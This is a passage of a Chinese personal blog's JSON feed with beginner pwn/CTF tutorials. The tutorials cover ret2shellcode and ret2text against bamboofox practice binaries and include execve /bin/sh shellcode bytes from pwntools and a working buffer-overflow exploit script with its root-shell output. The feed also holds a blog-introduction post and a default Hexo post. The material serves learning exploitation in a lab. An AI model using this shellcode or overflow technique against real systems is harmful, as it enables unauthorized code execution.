            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-2-ret2shellcode/",
            "title": "pwn入门-2-ret2shellcode",
            "date_published": "2022-10-13T13:12:12.000Z",
            "content_html": "<h1 id=\"ctfwiki的例子\"><a href=\"#ctfwiki的例子\" class=\"headerlink\" title=\"ctfwiki的例子\"></a>ctfwiki的例子</h1><p>bamboofox 中的 ret2shellcode:</p>\n<p>需要有可读可写可执行的段,将shellcode写入这里,然后执行shellcode</p>\n<p>这道题其实是给的一种很简单的方法,直接把shellcode写入了bss段,然后这个段是可读可写可执行的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:<span class=\"number\">0804</span>A065                 align <span class=\"number\">20</span>h</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080                 public buf2</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080 ; <span class=\"type\">char</span> buf2[<span class=\"number\">100</span>]</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080 buf2            db <span class=\"number\">64</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>           ; DATA XREF: main+<span class=\"number\">7B</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080 _bss            ends</span><br><span class=\"line\">.bss:<span class=\"number\">0804</span>A080</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"查看各个段的属性\"><a href=\"#查看各个段的属性\" class=\"headerlink\" title=\"查看各个段的属性\"></a>查看各个段的属性</h3><p>方法一:在gdb中调试,启动程序后用vmmap</p>\n<p>.bss:0804A080  对应着 0x804a000 0x804b000 0x001000 rwx &#x2F;home&#x2F;ubuntu&#x2F;shellcode&#x2F;ret2shellcode</p>\n<p>可读可写可执行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">[ Legend:  Code | Heap | Stack ]</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\"><span class=\"number\">0x8048000</span> <span class=\"number\">0x8049000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/shellcode/ret2shellcode</span><br><span class=\"line\"><span class=\"number\">0x8049000</span> <span class=\"number\">0x804a000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/shellcode/ret2shellcode</span><br><span class=\"line\"><span class=\"number\">0x804a000</span> <span class=\"number\">0x804b000</span> <span class=\"number\">0x001000</span> rwx /home/ubuntu/shellcode/ret2shellcode</span><br><span class=\"line\"><span class=\"number\">0xf7de5000</span> <span class=\"number\">0xf7fba000</span> <span class=\"number\">0x000000</span> r-x /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fba000</span> <span class=\"number\">0xf7fbb000</span> <span class=\"number\">0x1d5000</span> --- /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fbb000</span> <span class=\"number\">0xf7fbd000</span> <span class=\"number\">0x1d5000</span> r-x /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fbd000</span> <span class=\"number\">0xf7fbe000</span> <span class=\"number\">0x1d7000</span> rwx /lib/i386-linux-gnu/libc<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7fbe000</span> <span class=\"number\">0xf7fc1000</span> <span class=\"number\">0x000000</span> rwx</span><br><span class=\"line\"><span class=\"number\">0xf7fd0000</span> <span class=\"number\">0xf7fd2000</span> <span class=\"number\">0x000000</span> rwx</span><br><span class=\"line\"><span class=\"number\">0xf7fd2000</span> <span class=\"number\">0xf7fd5000</span> <span class=\"number\">0x000000</span> r-- [vvar]</span><br><span class=\"line\"><span class=\"number\">0xf7fd5000</span> <span class=\"number\">0xf7fd6000</span> <span class=\"number\">0x000000</span> r-x [vdso]</span><br><span class=\"line\"><span class=\"number\">0xf7fd6000</span> <span class=\"number\">0xf7ffc000</span> <span class=\"number\">0x000000</span> r-x /lib/i386-linux-gnu/ld<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7ffc000</span> <span class=\"number\">0xf7ffd000</span> <span class=\"number\">0x025000</span> r-x /lib/i386-linux-gnu/ld<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xf7ffd000</span> <span class=\"number\">0xf7ffe000</span> <span class=\"number\">0x026000</span> rwx /lib/i386-linux-gnu/ld<span class=\"number\">-2.27</span>.so</span><br><span class=\"line\"><span class=\"number\">0xfffdd000</span> <span class=\"number\">0xffffe000</span> <span class=\"number\">0x000000</span> rwx [<span class=\"built_in\">stack</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>方法二:readelf</p>\n<h2 id=\"pwntools中的shellcode相关函数\"><a href=\"#pwntools中的shellcode相关函数\" class=\"headerlink\" title=\"pwntools中的shellcode相关函数\"></a>pwntools中的shellcode相关函数</h2><p>shellcraft.sh() 汇编代码的shellcode</p>\n<p>asm(shellcraft.sh())  二进制机器码(16进制)的shellcode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellcraft.sh()</span><br><span class=\"line\"></span><br><span class=\"line\">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class=\"line\">    /* push b&#x27;/bin///sh\\x00&#x27; */</span><br><span class=\"line\">    push 0x68</span><br><span class=\"line\">    push 0x732f2f2f</span><br><span class=\"line\">    push 0x6e69622f</span><br><span class=\"line\">    mov ebx, esp</span><br><span class=\"line\">    /* push argument array [&#x27;sh\\x00&#x27;] */</span><br><span class=\"line\">    /* push &#x27;sh\\x00\\x00&#x27; */</span><br><span class=\"line\">    push 0x1010101</span><br><span class=\"line\">    xor dword ptr [esp], 0x1016972</span><br><span class=\"line\">    xor ecx, ecx</span><br><span class=\"line\">    push ecx /* null terminate */</span><br><span class=\"line\">    push 4</span><br><span class=\"line\">    pop ecx</span><br><span class=\"line\">    add ecx, esp</span><br><span class=\"line\">    push ecx /* &#x27;sh\\x00&#x27; */</span><br><span class=\"line\">    mov ecx, esp</span><br><span class=\"line\">    xor edx, edx</span><br><span class=\"line\">    /* call execve() */</span><br><span class=\"line\">    push SYS_execve /* 0xb */</span><br><span class=\"line\">    pop eax</span><br><span class=\"line\">    int 0x80</span><br><span class=\"line\"></span><br><span class=\"line\">asm(shellcraft.sh()) </span><br><span class=\"line\">b&#x27;jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80&#x27;</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/",
            "title": "pwn入门-1-初识",
            "date_published": "2022-10-11T08:49:11.000Z",
            "content_html": "<p>​\t学pwn有一段时间了,反反复复捣鼓一些东西,还是觉得以博客记录比较好,梳理自己的思路,会以第一人称来写,来记录学习的过程和结局思路(不是那种我是老师,教你学, 而是自己在探索.所以可能有时候会比较傻) 基础知识总有书和博客比我写得好,我觉得没有必要造轮子,所以有些基础知识可能会不会写的太细….反之,有一些博客上漏掉的细节,以及解题的关键会重点写(不会吧不会吧,真有人看你博客吗)</p>\n<p>​\t自己曾经说网上99%的博客都是垃圾(包括自己的),希望自己换了新博客后写的能质量高一点(至少越来越有长进)。(笑,不会真有人看你博客吧?)</p>\n<p>​\t第一篇文章首先来简单说一下自己目前认知的pwn</p>\n<h2 id=\"什么是pwn\"><a href=\"#什么是pwn\" class=\"headerlink\" title=\"什么是pwn?\"></a>什么是pwn?</h2><p>​\t简单来说就是二进制漏洞的利用,什么是二进制呢? 这里的二进制指的是二进制程序,也就是我们平常用高级语言编写的程序被编译链接后成为的01010101, 它们在操作系统中运行的时候,会因为操作系统和cpu等设计的问题,以及程序员的问题,出现各种bug,导致漏洞利用.</p>\n<p>​\t最常见的就是溢出类型的漏洞,在CTF中也是最常考察的,栈溢出,堆溢出等,在这之后会有虚拟化逃逸,内核漏洞等.</p>\n<p>​\t“万物皆可pwn”,尤其是现在iot的发展,多种设备都联入网络,像汽车,智能家居,安保系统等,都可能被“pwn“掉</p>\n<h2 id=\"如何入门\"><a href=\"#如何入门\" class=\"headerlink\" title=\"如何入门?\"></a>如何入门?</h2><p>​\t这个问题我没法回答,因为我现在正在入门……….我只能说一些我目前正在做的事情,仅供参考</p>\n<h3 id=\"1-系统地打好计算机基础\"><a href=\"#1-系统地打好计算机基础\" class=\"headerlink\" title=\"1.系统地打好计算机基础\"></a>1.系统地打好计算机基础</h3><p>​\tpwn和web不一样,是比较底层的,需要的计算机知识很多,基础不牢地动山摇,所以要有较好的计算机基础.</p>\n<p>​\t包括但不限于 操作系统、汇编语言、体系结构、编译原理、C语言等</p>\n<p>​\t作者目前研一,还有一段时间用来打基础,建议大家在本科期间就好好打基础呀 (半路出家的痛)</p>\n<p>​\t目前选了学校的一些课程,同时在看一些书和视频等</p>\n<h4 id=\"一-计算机体系结构\"><a href=\"#一-计算机体系结构\" class=\"headerlink\" title=\"(一)计算机体系结构\"></a>(一)计算机体系结构</h4><p>​\t或者说计算机组成原理,是非常非常基础和重要的(本科时候学的太烂的),国科大的胡伟武老师讲这门课(放弃申报院士,为国家做芯片,龙芯董事长,首席科学家!!!! 超级牛的老师)</p>\n<p>​\t这门课能让你懂计算机的运行原理,CPU的原理,计算机是如何工作的,从电路、元器件的原理上去深入理解计算机</p>\n<p>​\t推荐书籍: </p>\n<p>《计算机体系结构基础 第三版》 胡伟武 这是给国科大的本科生看的,但我觉得不论什么水平看一看都有收获</p>\n<p>《计算机体系结构 第二版》胡伟武          这是给研究生推荐的教材,可以作为进阶看</p>\n<p>《深入理解计算机系统》     经典黑书..</p>\n<h4 id=\"二-操作系统\"><a href=\"#二-操作系统\" class=\"headerlink\" title=\"(二)操作系统\"></a>(二)操作系统</h4><p>​\t操作系统可以说</p>\n<h2 id=\"从最简单的一个栈溢出开始了解pwn\"><a href=\"#从最简单的一个栈溢出开始了解pwn\" class=\"headerlink\" title=\"从最简单的一个栈溢出开始了解pwn\"></a>从最简单的一个栈溢出开始了解pwn</h2><h2 id=\"什么是栈\"><a href=\"#什么是栈\" class=\"headerlink\" title=\"什么是栈?\"></a>什么是栈?</h2><p>​\t栈是用来存储用户输入,函数变量,寄存器的值等的一块内存空间,它从高地址向低地址生长</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011171330747.png\" alt=\"图片描述\"></p>\n<h3 id=\"什么是缓冲区溢出\"><a href=\"#什么是缓冲区溢出\" class=\"headerlink\" title=\"什么是缓冲区溢出?\"></a>什么是缓冲区溢出?</h3><p>​\t在上图中, buffer是<font color=\"red\">用户能够可控的</font>,用户能够可控的事实上便不安全,如果没有对buffer的大小进行正确的控制,buffer超过了128字节,则会产生溢出.</p>\n<p>​\t那么产生了溢出又会怎样呢? 先看最直接的效果,buffer的地址是从低地址向高地址生长的,那么它往上溢出,就会覆盖ebp和返回地址,以及等等.</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011171912415.png\" alt=\"image-20221011171912415\" style=\"zoom:50%;\">\n\n<p>​\t那么覆盖了又会怎样呢?? 这里就需要了解函数调用的基础了(基础知识很重要!),这里先简单的说,在我们当前这个函数被调用完成,进行return的时候,它会return到哪呢? 就是我们存储的<font color=\"red\">返回地址(return address)</font>,所以,答案就来了,如果我们把返回地址修改为恶意代码的地址,是不是就能够对它进行劫持? 是的,这种手法就叫劫持控制流</p>\n<h3 id=\"一个简单的例子-ret2backdoor-x2F-ret2text\"><a href=\"#一个简单的例子-ret2backdoor-x2F-ret2text\" class=\"headerlink\" title=\"一个简单的例子, ret2backdoor&#x2F;ret2text\"></a>一个简单的例子, ret2backdoor&#x2F;ret2text</h3><p>题目来源于bamboofox中的ret2text</p>\n<p>题目链接:</p>\n<p>​\t一般我们拿到的都是二进制文件,没有源代码,但我们不能直接读01吧,读汇编也很难吧(大佬除外),所以我们需要工具来帮我们反编译反汇编,反汇编是把01那些转换成汇编代码,反编译是把汇编转换成高级语言(如c语言)</p>\n<p>​\t这时候我们需要借助一个工具, ida pro, 别的工具也可以,不过ida确实是非常好用啊</p>\n<p>​\t</p>\n<h4 id=\"动态调试\"><a href=\"#动态调试\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h4><p>​\t啥是动态调试呢? 静态分析是看源程序的汇编代码,程序是死的,动态调试就是让程序跑起来,在程序运行的时候,在某个节点断下来,查看程序的运行时状态,如栈的布局,寄存器等等,来寻找漏洞和探索利用方式,这里同样我们要用一些工具,首先是gdb,gdb本身不是为了漏洞利用而生的,而是给程序员来调试程序用的.</p>\n<p>​\t(这里还需要安装一个插件, gef ,具体安装可以google,有很多安装教程,或者直接看github仓库)   不过,为啥要安插件呢? 因为没插件不好用,插件能够帮你提取重要信息,以及给你增加很多方便漏洞调试的命令.</p>\n<p>​\t我们用 gdb 文件名 来启动调试</p>\n<p>​\tstart 从第一条指令开始运行<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173542682.png\" alt=\"image-20221011173542682\"></p>\n<p>​\tni 一步一步往下执行(遇到函数时不进入,直接执行完)</p>\n<p>这里我们执行到了gets函数,它就是用来读取我们用户输入的,我们先来随便输入一串a</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173723873.png\" alt=\"image-20221011173723873\" style=\"zoom:50%;\">\n\n\n\n<p>telescope 查看栈的情况  连续按回车可以一直往下展示栈(其实是重复当前命令)</p>\n<p>能够看到 esp提示你 0xffffd56c这个位置存储的是这一串a,往下看,确实是,</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173849858.png\" alt=\"image-20221011173849858\" style=\"zoom:50%;\">\n\n<p>当我们继续往下看的时候,我们看到了ebp</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20221011173946237.png\" alt=\"image-20221011173946237\" style=\"zoom:50%;\">\n\n\n\n<p>根据我们上面对栈的理解,buf之后是ebp然后是返回地址 (实际上实际情况可能比这还要复杂,暂且这样)</p>\n<p>所以我们也可以从这里算覆盖地址,用ebp的地址 - 字符串开头,也就是buffer的地址, 就可以算出来要填充的字节数</p>\n<p>0xffffd5d8 - 0xffffd56c &#x3D; 108 这是到ebp的, 再加上ebp 4个字节,于是就是 112 字节, 然后就是返回地址了</p>\n<p>那么返回地址我们返回到哪呢? 我们刚才在静态分析的时候已经分析到了存在后门函数,地址是0x804863a,所以我们返回这个后门的地址就可以了!</p>\n<p><font color=\"red\">ctfwiki里解释的太粗了,为什么eax的位置就是字符串开始读取的位置呢????????? </font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/image-20230218154658066.png\" alt=\"image-20230218154658066\"></p>\n<h4 id=\"构造payload与exp\"><a href=\"#构造payload与exp\" class=\"headerlink\" title=\"构造payload与exp\"></a>构造payload与exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload =  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">108</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">4</span>  + retaddress</span><br><span class=\"line\">// <span class=\"number\">108</span>是覆盖缓冲区,<span class=\"number\">4</span>是覆盖ebp,然后就是返回地址了</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;ret2text&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">retaddress = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">payload = payload =  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">108</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">4</span>  + p32(retaddress)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/zhan# python3 <span class=\"built_in\">exp</span>.py</span><br><span class=\"line\">[!] Could not find executable <span class=\"string\">&#x27;ret2text&#x27;</span> in $PATH, using <span class=\"string\">&#x27;./ret2text&#x27;</span> instead</span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./ret2text&#x27;</span>: pid <span class=\"number\">16542</span></span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">There is something amazing here, <span class=\"keyword\">do</span> you know anything?</span><br><span class=\"line\">$ id</span><br><span class=\"line\">Maybe I will tell you next time !$ whoami</span><br><span class=\"line\">root</span><br><span class=\"line\">$ ls</span><br><span class=\"line\"><span class=\"built_in\">exp</span>.py    ret2text  shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">于是我们就拿到权限了!</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"关于和pwntools的联动问题\"><a href=\"#关于和pwntools的联动问题\" class=\"headerlink\" title=\"关于和pwntools的联动问题\"></a>关于和pwntools的联动问题</h2><p>sh.send(payload)<br>pause()</p>\n<p>想达到在刚发送完这条payload,查看之后的效果,如果这样的话,是不行的,这样的话估计是执行了很多条之后的了,为什么呢?</p>\n<p>如果想达到上述效果,需要下断点. 先调试找到断点,然后在gdb.attach的时候下断点</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0xf7e4c624</span> &lt;gets+<span class=\"number\">292</span>&gt;    call   __uflow                    &lt;__uflow&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0xf7e4c629</span> &lt;gets+<span class=\"number\">297</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>下断点下到0xf7e4c629就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2text&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh,<span class=\"string\">&quot;b *0xf7e4c624&quot;</span>)</span><br><span class=\"line\">retaddress = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">payload = payload =  <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">108</span> + <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">4</span>  + p32(retaddress)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>运行的时候感觉不是到断点那里了,差了一些,但是可以一直往下n,还是差不多的</p>\n<p>需要输入的时候 切换到左边按一下回车,就发送过去了</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/",
            "url": "https://tangzichengcc.github.io/%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/",
            "title": "一个新的开始",
            "date_published": "2022-10-04T12:41:10.000Z",
            "content_html": "<h3 id=\"📆为什么要打算开博客呢\"><a href=\"#📆为什么要打算开博客呢\" class=\"headerlink\" title=\"📆为什么要打算开博客呢?\"></a>📆为什么要打算开博客呢?</h3><p>​\t记录自己的成长历程以及写一些技术博客我觉得是很有意义的事情,之前都是用csdn,因为它<del>太垃圾了</del> ,所以决定换掉, 还是自己能够自定义的比较好,不受人的牵制.</p>\n<p>​\t来到雁栖湖快两个月了, 开启了人生的新篇章,在这里,见识到了多场非常多的大牛老师以及大佬同学,看到了和他们的差距,希望自己能在雁栖湖这一年好好积累知识, ( 毕竟这是不怎么用打工,很悠闲的一年喂)</p>\n<h3 id=\"🎖打算记录些什么呢\"><a href=\"#🎖打算记录些什么呢\" class=\"headerlink\" title=\"🎖打算记录些什么呢?\"></a>🎖打算记录些什么呢?</h3><h4 id=\"🚩技术\"><a href=\"#🚩技术\" class=\"headerlink\" title=\"🚩技术\"></a>🚩技术</h4><p>​\t研究生想往pwn发展,会记录pwn的入门历程(从0到0.01)以及比赛的writeup, 其他自己接触到的各种技术觉得有意义的可能都会写一点</p>\n<p>​\t目前的计划大概是一周一篇,希望能控制好质量</p>\n<h4 id=\"🌸人生\"><a href=\"#🌸人生\" class=\"headerlink\" title=\"🌸人生\"></a>🌸<del>人生</del></h4><h3 id=\"🎯研究生有什么目标呢\"><a href=\"#🎯研究生有什么目标呢\" class=\"headerlink\" title=\"🎯研究生有什么目标呢?\"></a>🎯研究生有什么目标呢?</h3><p><del>希望财富自由</del>, 赚100万💰吧</p>\n<p>希望能找到自己更明确的目标,希望自己磨练好技艺,希望自己能去探索更大的世界</p>\n<p>最重要的是,希望自己能找到内心的平静、能做一个好人</p>\n<h3 id=\"🥳写给读者的话-希望这个博客能有人看2333\"><a href=\"#🥳写给读者的话-希望这个博客能有人看2333\" class=\"headerlink\" title=\"🥳写给读者的话(希望这个博客能有人看2333)\"></a>🥳写给读者的话(希望这个博客能有人看2333)</h3><p>非常感谢您来看这只小菜狗的博客!如果有任何问题想交流,欢迎联系!</p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/hello-world/",
            "url": "https://tangzichengcc.github.io/hello-world/",
            "title": "Hello World",
            "date_published": "2022-10-02T14:34:31.363Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}